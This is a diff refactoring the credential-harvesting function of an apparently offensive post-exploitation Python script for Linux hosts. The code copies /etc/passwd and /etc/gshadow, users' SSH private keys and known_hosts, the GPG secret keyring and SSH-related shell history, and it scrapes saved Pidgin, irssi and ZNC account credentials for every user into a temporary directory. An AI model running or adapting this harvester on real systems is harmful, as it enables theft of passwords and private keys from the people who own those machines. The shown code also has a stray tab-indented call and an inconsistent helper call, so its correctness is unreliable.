@@ -2,7 +2,7 @@
 # Gathers user and system credentials and passwords from the remote host. We look for things like crypto keys, ssh keys, shadow files, app credentials, etc.
 def creds():
     print("[+] Collecting user and system credentials....")
-    os.mkdir(Temp_Dir+"/credentials")
+    maketemp("credentials")
     os.chdir(Temp_Dir+"/credentials/")
     
     os.system('getent passwd > passwd.txt')
@@ -13,12 +13,9 @@ def creds():
 
     
     os.system("find / -maxdepth 3 -name .ssh > ssh_locations.txt")
-    os.system("ls /home/*/.ssh/* > ssh_contents.txt")    
+    os.system("ls /home/*/.ssh/* > ssh_contents.txt")   
     sshfiles = ["ssh_locations.txt","ssh_contents.txt"]
-    content = ''
-    for f in sshfiles:
-       content = content + '\n' + open(f).read()
-    open('SSH_Locations.txt','wb').write(content)
+    combinefiles("SSH_Locations.txt", sshfiles)
     os.system("rm ssh_locations.txt ssh_contents.txt")
     if os.path.exists(Home_Dir+"/.bash_history") is True:
         os.system("cat "+Home_Dir+"/.bash_history | grep ssh > SSH_History.txt")
@@ -28,19 +25,12 @@ def creds():
                     Home_Dir+"/.ssh/id_rsa", Home_Dir+"/.ssh/id_rsa.pub", Home_Dir+"/.gnupg/secring.gpg", Home_Dir+"/.ssh/authorized_keys",
                     Home_Dir+"/.ssh/known_hosts", "/etc/gshadow", "/etc/ca-certificates.conf", "/etc/passwd" ]
     for x in credentials:
-    	if os.path.exists(x) is True:
-    		shutil.copy2(x, Temp_Dir+"/credentials/")
+        copy2temp(x, "credentials")
 
-    users = []
-    passwd = open('/etc/passwd')
-    for line in passwd:
-        fields = line.split(':')
-        uid = int(fields[2])
-        if uid > 500 and uid < 32328:
-             users.append(fields[0])
 
+	users()
     if whereis('pidgin') is not None:
-        for user in users:
+        for user in userlist:
             if os.path.exists("/home/"+user+"/.purple/accounts.xml") is True:
                 accts = open("/home/"+user+"/.purple/accounts.xml")
                 saved = open("Pidgin.txt", "a")
@@ -57,7 +47,7 @@ def creds():
                 accts.close()
                 saved.close()
 
-    for user in users:
+    for user in userlist:
         if os.path.exists("/home/"+user+"/.irssi/config") is True:
             accts = open("/home/"+user+"/.irssi/config")
             saved = open("irssi.txt", "a")
@@ -69,10 +59,8 @@ def creds():
             accts.close()
             saved.close()
 
-    for user in users:
-        if os.path.exists("/home/"+user+"/.znc/configs/znc.conf") is True:
-            shutil.copy2("/home/"+user+"/.znc/configs/znc.conf", "znc.conf")
-        else:
-            pass           
+    for user in userlist:
+        copy2temp("/home/"+user+"/.znc/configs/znc.conf")
+           
             
 
